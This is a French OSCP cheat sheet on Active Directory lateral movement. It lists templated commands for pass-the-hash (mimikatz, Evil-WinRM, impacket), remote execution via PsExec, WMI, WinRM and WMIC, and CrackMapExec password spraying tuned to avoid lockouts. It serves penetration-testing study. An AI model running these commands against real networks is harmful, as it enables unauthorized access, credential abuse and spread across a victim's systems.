---
title: "OSCP · Active Directory : mouvement latéral"
description: "Référence des accès distants et protocoles entre hôtes Windows."
---

# OSCP · Active Directory : mouvement latéral

Référence des accès distants et protocoles entre hôtes Windows.


## Techniques et préparation


Commande `powershell` pour la rubrique « Techniques et préparation ».

```powershell
powershell -ExecutionPolicy Bypass -File [script].ps1
```


Commande `mimikatz` pour la rubrique « Techniques et préparation ».

```powershell
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell

# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
.\PsExec.exe \\<target_system> cmd
```


### Evil-WinRM

Observer les permissions et la configuration de Windows.


Commande `evil-winrm` pour la rubrique « Evil-WinRM ».

```bash
evil-winrm -u <username> -p <password> -i <target_ip>
```


Commande `evil-winrm` pour la rubrique « Evil-WinRM ».

```bash
# Use -S option to ignore SSL validation for insecure systems.
evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
# or
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
```


### PsExec


Commande `impacket-psexec` pour la rubrique « PsExec ».

```bash
impacket-psexec <username>:<password>@<target_ip>
```


Commande `impacket-psexec` pour la rubrique « PsExec ».

```bash
impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
# or
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>
```


### VMIExec


Commande `impacket-wmiexec` pour la rubrique « VMIExec ».

```bash
impacket-wmiexec <username>:<password>@<target_ip>
```


Commande `impacket-wmiexec` pour la rubrique « VMIExec ».

```bash
impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
```


## Depuis Windows

Observer les permissions et la configuration de Windows.


### DCOM (Distributed Component Object Model)


Commande `get-itemproperty` pour la rubrique « DCOM (Distributed Component Object Model) ».

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
```


**Paramètres et repères :**
`Invoke-Command`  


Exemple technique pour la rubrique « DCOM (Distributed Component Object Model) ».

```powershell
$targetIP = "<target_ip>"  # Replace with the actual target IP
$username = "<username>"    # Replace with the actual username
$password = "<password>"     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
```


**Paramètres et repères :**
`vmiexec`  


Commande `wmiexec.py` pour la rubrique « DCOM (Distributed Component Object Model) ».

```bash
wmiexec.py <domain>/<username>:<password>@<target_ip>
# or
wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
```


### PsExec


Commande `psexec.exe` pour la rubrique « PsExec ».

```bash
psexec.exe \\<target_ip> -u <username> -p <password> cmd
```


### WinRM

Observer les permissions et la configuration de Windows.


Exemple technique pour la rubrique « WinRM ».

```powershell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <target_ip> -Credential $credential;
```


### WinRS


Commande `winrs` pour la rubrique « WinRS ».

```powershell
winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
```


### WMIC


Commande `wmic` pour la rubrique « WMIC ».

```powershell
wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
```


## Credential Spraying with CrackMapExec

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Tips for Credential Spraying

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`--delay` (délai) · `--max-retries` (limite des tentatives)  


Énumérer les informations SMB ou RPC.

```bash
# Check policies with a tool like rpcclient
rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

# Test multiple passwords with a max retries limit to avoid lockouts
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
```


Examiner le service distant avec les paramètres fournis.

```bash
# Use CrackMapExec's --target option to narrow focus
crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
```


**Paramètres et repères :**
`--local-auth` (authentification locale)  


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
```


Examiner les ports et les services avec Nmap.

```bash
nmap -p 5985,1433,445,3389 <TARGET_IP>
```


**Paramètres et repères :**
`-p` · `-H`  


Examiner le service distant avec les paramètres fournis.

```bash
# Test both passwords and NTLM hashes
crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>
```


### SMB

Examiner les objets, les droits et les services du domaine.


Examiner le service distant avec les paramètres fournis.

```bash
# Test a single password across all users in the domain
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
```


Examiner le service distant avec les paramètres fournis.

```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Test credentials against local accounts not part of the domain
crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
```


Examiner le service distant avec les paramètres fournis.

```bash
# Execute a command on a remote machine with valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### WinRM (Windows Remote Management)

Observer les permissions et la configuration de Windows.


Examiner le service distant avec les paramètres fournis.

```bash
# Test credentials on the main domain via WinRM
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5

# Test NTLM hash
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5

# Execute a command
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
```


Examiner le service distant avec les paramètres fournis.

```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Authenticate with a local user account
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


Examiner le service distant avec les paramètres fournis.

```bash
# Execute a command remotely
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"

# Using an NTLM hash
crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"
```


### PsExec (SMB-Based Lateral Movement)

Examiner les objets, les droits et les services du domaine.


Examiner le service distant avec les paramètres fournis.

```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
```


Examiner le service distant avec les paramètres fournis.

```bash
# Execute a remote command
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using an NTLM hash
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### VMIExec


Examiner le service distant avec les paramètres fournis.

```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec
```


### LDAP (Lightweight Directory Access Protocol)

Examiner les objets, les droits et les services du domaine.


Examiner le service distant avec les paramètres fournis.

```bash
# Authenticate and enumerate users on the main domain
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Enumerate users on a subdomain
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


### MSSQL (Microsoft SQL Server)

Examiner les connexions, la configuration et les requêtes de la base de données.


Examiner le service distant avec les paramètres fournis.

```bash
# Test main domain credentials on an MSSQL server
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Test credentials on a subdomain MSSQL server
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Test local user credentials on MSSQL
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### RDP


Examiner le service distant avec les paramètres fournis.

```bash
# Test credentials against an RDP service on the main domain
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Test credentials on an RDP service in a subdomain
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


Examiner le service distant avec les paramètres fournis.

```bash
# Authenticate to RDP with local credentials
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### FTP

Transférer ou récupérer des fichiers dans le laboratoire.


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### SSH


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### HTTP

Examiner les entrées et les réponses de l'application web.


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
